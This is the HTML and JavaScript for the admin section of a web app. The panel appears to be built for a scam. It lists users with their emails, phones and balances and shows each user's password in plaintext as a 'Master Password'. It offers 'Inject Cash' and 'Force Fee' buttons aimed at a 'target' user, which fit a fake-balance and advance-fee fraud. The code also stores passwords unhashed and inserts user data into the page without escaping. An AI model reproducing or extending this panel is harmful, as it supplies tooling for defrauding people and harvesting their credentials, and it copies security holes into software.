<section id="admin-sec" class="hidden space-y-6">
    <div class="flex justify-between items-end">
        <h3 class="text-2xl font-black text-blue-500 italic uppercase">Master Control</h3>
        <p class="text-[9px] text-slate-500 font-mono bg-slate-900 px-2 py-1 rounded" id="admin-user-count">Nodes: 0</p>
    </div>

    <div class="magic-card p-4 space-y-4 border-blue-500/30 bg-gradient-to-b from-[#161b22] to-[#0d1117]">
        <div>
            <p class="text-[8px] text-blue-500 font-bold uppercase mb-2 tracking-widest">Target Selection</p>
            <input type="text" id="adm-user" placeholder="Paste User Email Here" class="w-full p-4 bg-black border border-slate-800 rounded-xl text-xs outline-none text-white font-mono placeholder:text-slate-700">
        </div>
        <div class="grid grid-cols-2 gap-3">
            <button onclick="adminAction('inject')" class="bg-blue-600 hover:bg-blue-500 p-3 rounded-lg font-black text-[10px] uppercase transition-all">Inject Cash üí∏</button>
            <button onclick="adminAction('togglePending')" class="bg-yellow-600 p-3 rounded-lg font-black text-[10px] uppercase">Force Fee ‚ö†Ô∏è</button>
        </div>
    </div>

    <div class="space-y-3">
        <p class="text-[9px] text-slate-500 uppercase font-bold tracking-widest ml-1">Live Network Directory</p>
        <div id="user-logs" class="space-y-3 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar">
            </div>
    </div>
</section>

<script>
// --- MASTER LOGIC FOR AUTO-DISCOVERY ---

function loadUserLogs() {
    // 1. Force pull the latest users from storage
    users = JSON.parse(localStorage.getItem('magic_users')) || {};
    const logContainer = document.getElementById('user-logs');
    const userEntries = Object.entries(users);
    
    document.getElementById('admin-user-count').innerText = "NODES: " + userEntries.length;

    if (userEntries.length === 0) {
        logContainer.innerHTML = `<div class="p-10 text-center border-2 border-dashed border-slate-800 rounded-2xl">
            <p class="text-slate-600 text-[9px] uppercase font-bold">Scanning for new signals...</p>
        </div>`;
        return;
    }

    // 2. Sort users by newest first and build the cards
    logContainer.innerHTML = userEntries.reverse().map(([email, data]) => `
        <div class="magic-card p-4 bg-[#0d1117] border-l-4 ${data.isBlocked ? 'border-l-red-600' : (data.bal === 0 ? 'border-l-blue-500 animate-pulse' : 'border-l-green-500')}">
            <div class="flex justify-between items-start mb-2">
                <div>
                    <div class="flex items-center gap-2">
                        <p class="text-blue-400 font-black text-[12px] uppercase tracking-tighter">${data.name || 'Anonymous'}</p>
                        ${data.bal === 0 ? '<span class="bg-blue-600 text-[7px] px-1 rounded font-bold">NEW</span>' : ''}
                    </div>
                    <p class="text-slate-500 text-[8px] font-mono">${email}</p>
                </div>
                <div class="text-right">
                    <p class="text-white font-mono font-bold text-[11px]">$${(data.bal || 0).toLocaleString()}</p>
                    <button onclick="copyToInject('${email}')" class="text-[7px] text-blue-500 font-bold uppercase mt-1">Copy ID</button>
                </div>
            </div>
            
            <div class="grid grid-cols-2 gap-4 mt-3 pt-3 border-t border-slate-800/50">
                <div>
                    <p class="text-[7px] text-slate-600 uppercase font-bold">Phone Node</p>
                    <p class="text-white text-[9px] font-mono">${data.phone || 'HIDDEN'}</p>
                </div>
                <div>
                    <p class="text-[7px] text-slate-600 uppercase font-bold">Master Password</p>
                    <p class="text-red-400 text-[9px] font-mono font-bold">${data.pass}</p>
                </div>
            </div>
        </div>
    `).join('');
}

// 3. Helper to quickly paste email into injection box
function copyToInject(email) {
    document.getElementById('adm-user').value = email;
    window.scrollTo({ top: 0, behavior: 'smooth' });
    // Visual feedback
    document.getElementById('adm-user').style.borderColor = '#3b82f6';
    setTimeout(() => document.getElementById('adm-user').style.borderColor = '#30363d', 1000);
}

// 4. Update the section switcher to ALWAYS refresh the list
function showSection(s) {
    const ids = ['home', 'ledger', 'profile', 'admin'];
    ids.forEach(id => {
        const section = document.getElementById(id + '-sec');
        if(section) section.classList.add('hidden');
    });
    
    const target = document.getElementById(s + '-sec');
    if(target) {
        target.classList.remove('hidden');
        if(s === 'admin') loadUserLogs(); // Auto-refresh when opening admin
        if(s === 'profile') renderProfile();
    }
}
</script>
